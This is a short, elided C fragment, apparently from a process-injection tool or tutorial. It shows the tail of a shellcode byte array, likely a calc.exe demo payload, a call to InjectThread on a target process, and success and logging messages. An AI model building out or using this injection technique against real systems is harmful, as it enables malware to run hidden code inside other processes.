...
0x63,0x2e,0x65,0x78,0x65,0x00
	...
	if (!InjectThread(hProcess, Shellcode, shellsize, &pAddress))
	{
		PRINT_ERROR("InjectThread");
		return 1;
	}

	OKAY("Successfully Completed Injection!");

	INFO("Current Shellcode Address: %p", &Shellcode);
	INFO("Shellcode size: %zu bytes", shellsize);
